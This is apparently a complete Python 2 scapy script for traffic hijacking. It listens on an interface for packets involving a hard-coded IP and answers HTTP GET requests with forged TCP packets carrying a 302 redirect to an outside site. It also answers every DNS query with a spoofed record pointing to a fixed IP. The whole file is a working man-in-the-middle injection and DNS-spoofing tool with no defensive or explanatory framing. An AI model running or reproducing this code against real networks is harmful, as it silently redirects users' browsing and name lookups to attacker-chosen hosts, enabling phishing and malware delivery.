import scapy.all as scapy
from select import select
import helper


interface = "eth0"

redirmsg = ["HTTP/1.1 302 Found",
            #"Location: %(url)s",
            "Location: http://r.0x0a.net/",
            "Cache-Control: private",
            "Content-Type: text/html; charset=UTF-8",
            "Server: o_o",
            "Content-Length: 0",
            "",
            ""]

redirpkt = '\r\n'.join(redirmsg)

def pkt_callback(pkt):

    if pkt.haslayer(scapy.Dot11):
        #print("got Wifi packet")
        # construct fake l2 for wifi packet
        macl = pkt.getlayer(scapy.Dot11)
        l2 = scapy.RadioTap() / scapy.Dot11(addr1 = macl.addr2, addr2 = macl.addr1, addr3 = macl.addr3, FCfield="from-DS") / scapy.LLC(ctrl=3) / scapy.SNAP()
    elif pkt.haslayer(scapy.Ether):
        #print("got Ethernet packet")
        # construct fake l2 for ethernet packet
        macl = pkt.getlayer(scapy.Ether)
        l2 = scapy.Ether(dst = macl.src, src = macl.dst)
    else:
        print("protocol neither ethernet nor wifi, skipping")
        return

    if pkt.haslayer(scapy.IP):
        # construct fake l3
        ipl = pkt.getlayer(scapy.IP)
        l3 = scapy.IP(src = ipl.dst, dst = ipl.src)
    else:
        #print("this is not IP packet, skipping")
        return

    if pkt.haslayer(scapy.TCP):
        #print("we have TCP packet")
        # construct fake layer 4 for TCP
        tcpl = pkt.getlayer(scapy.TCP)
        l4 = scapy.TCP(dport = tcpl.sport, sport = tcpl.dport)

        if tcpl.flags == 2: # syn
            return
        elif tcpl.flags == 24 or tcpl.flags == 16: # psh ack
            if pkt.haslayer(scapy.Raw):
                #print("packet has some data")
                tcpdata = pkt.getlayer(scapy.Raw).load
                if tcpdata.startswith("GET "):
                    #print("TCP data starts with GET")

                    dsturl = helper.getdsturl(tcpdata)

                    if dsturl is None:
                        return
                    
                    print("IP: %s, DST URL: %s" % (pkt.getlayer(scapy.IP).src, dsturl))

                    if dsturl.find('0x0a') != -1 or dsturl.find('85.17') != -1 or dsturl.find('twitter') != -1 or dsturl.find('facebook') != -1 or dsturl.find('vk.com') != -1 or dsturl.find('blogger') != -1 or dsturl.find('odnoklassniki') != -1:
                        print "inject success"
                        return

                    #credirpkt = redirpkt % {'url': "http://0x0a.net/" }
                    credirpkt = redirpkt

                    # construct reply packet
                    pktreply = l2 / l3 / l4
                    pktreply.getlayer(scapy.TCP).seq = tcpl.ack
                    pktreply.getlayer(scapy.TCP).ack = tcpl.seq + len(tcpdata)
                    pktreply.getlayer(scapy.TCP).flags = "PA"

                    # construct fin packet
                    finpktreply = pktreply.copy()
                    finpktreply.getlayer(scapy.TCP).flags = "FA"
                    finpktreply.getlayer(scapy.TCP).seq += len(credirpkt)

                    # add redir payload to reply packet
                    pktreply.getlayer(scapy.TCP).add_payload(credirpkt)

                    packetbasket = [pktreply, finpktreply]

                    # send reply packet
                    scapy.sendp(packetbasket, verbose = 0, iface = interface)
                    print("Reply sent")
            return

        elif tcpl.flags == 17: # fin ack
            return

    elif pkt.haslayer(scapy.UDP):
        # construct layer 4 for UDP
        udpl = pkt.getlayer(scapy.UDP)
        l4 = scapy.UDP(dport=udpl.sport, sport=udpl.dport)

        if pkt.haslayer(scapy.DNS):
            #print("We got DNS packet")
            dnsl = pkt.getlayer(scapy.DNS)
            if dnsl.qr == 0:
                print("We got DNS request packet: %s" % (dnsl.qd.qname))

                pktreply = l2 / l3 / l4 / scapy.DNS(id=dnsl.id, qr=1, qd=dnsl.qd, an=scapy.DNSRR(rrname=dnsl.qd.qname, ttl = 10, rdata="85.17.93.121"))
                scapy.sendp([pktreply], verbose = 0, iface = interface)
                print("Reply sent")
        return

    else:
        print("protocol not TCP or UDP, skipping")
        #pkt.show()
        return

    #pkt.show()
if __name__ == "__main__":
    L2socket = scapy.conf.L2listen
    s = L2socket(type=scapy.ETH_P_ALL, iface = interface, filter='host 81.19.90.148')
    while 1:
        sel = select([s],[],[], None)
        if s in sel[0]:
            p = s.recv(scapy.MTU)
            if p is None:
                break
            pkt_callback(p)
